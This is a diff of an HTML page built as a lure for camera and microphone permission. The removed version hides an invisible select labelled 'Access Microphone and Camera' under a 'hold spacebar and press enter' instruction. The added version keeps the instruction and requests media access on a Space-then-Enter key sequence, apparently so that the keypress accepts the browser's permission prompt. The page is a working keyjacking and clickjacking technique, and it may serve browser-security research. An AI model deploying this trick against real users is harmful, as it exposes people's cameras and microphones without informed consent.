@@ -7,24 +7,13 @@
   <style>
     body {
       font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 20px;
     }
-    .container {
-      position: absolute;
-      margin-top: 20px;
-    }
-    .message {
-      width: 100px;
-      margin-left: 50px;
-    }
-    .select-container {
-      margin-left: 80px;
-      margin-top: 20px;
-      z-index: 1;
-      position: absolute;
-    }
-    #sf {
-      width: 200px;
-      opacity: 0;
+    h1 {
+      font-size: 24px;
+      color: #333;
+      margin-bottom: 20px;
     }
     video {
       max-width: 100%;
@@ -32,59 +21,49 @@
     }
   </style>
 </head>
-<body id="xx" onload="initialize()">
-
-  <div class="container">
-    <label>
-      <span class="message">HOLD SPACEBAR AND FASTLY PRESS ENTER</span>
-    </label>
-  </div>
-
-  <div class="select-container">
-    <span id="xz" style="width: 100px;"></span>
-    <select id="sf">
-      <option value="0">
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-        Access Microphone and Camera
-      </option>
-    </select>
-  </div>
+<body onload="initialize()">
+  <h1>Hold SPACEBAR and FAST Press ENTER, see the magic!</h1>
 
   <script>
-    // This function will initialize and bind events to the select element
+    let mediaStreamStarted = false; // Prevent multiple attempts to start media
+
     function initialize() {
-      const selectElement = document.getElementById("sf");
-      selectElement.addEventListener('click', getMedia);
-      selectElement.addEventListener('dblclick', getMedia);
-      selectElement.addEventListener('keypress', getMedia);
+      // Add a listener for keydown events
+      document.addEventListener('keydown', handleKeydown);
     }
 
-    // Function to get the audio and video stream from the user's microphone and camera
+    function handleKeydown(e) {
+      // Check if SPACEBAR + Enter combination is pressed
+      if (e.code === 'Space' && e.repeat === false) {
+        // Wait for Enter after spacebar is pressed
+        document.addEventListener('keydown', (event) => {
+          if (event.code === 'Enter') {
+            getMedia();
+          }
+        });
+      }
+    }
+
     function getMedia() {
+      if (mediaStreamStarted) return; // Prevent multiple calls to getUserMedia
+      mediaStreamStarted = true;
+
       navigator.mediaDevices.getUserMedia({ audio: true, video: true })
         .then(function(stream) {
-          // Successfully received the audio and video streams
-          const audioContext = new AudioContext();
-          const audioSource = audioContext.createMediaStreamSource(stream);
-          
-          // Create a video element to display the camera feed
+          console.log("Audio and video stream received");
+
           const videoElement = document.createElement("video");
           videoElement.srcObject = stream;
           videoElement.autoplay = true;
-          videoElement.playsInline = true; // For mobile devices to autoplay inline
-          
-          // Optionally, append the video element to the body to show the camera feed
-          document.body.appendChild(videoElement);
+          videoElement.playsInline = true;
 
-          console.log("Audio and video stream received");
+          document.body.appendChild(videoElement);
         })
         .catch(function(err) {
-          // Handle errors, such as permission denied or device issues
           console.error('Error accessing media devices:', err);
           alert("Failed to access microphone or camera: " + err.message);
         });
     }
   </script>
-
 </body>
 </html>
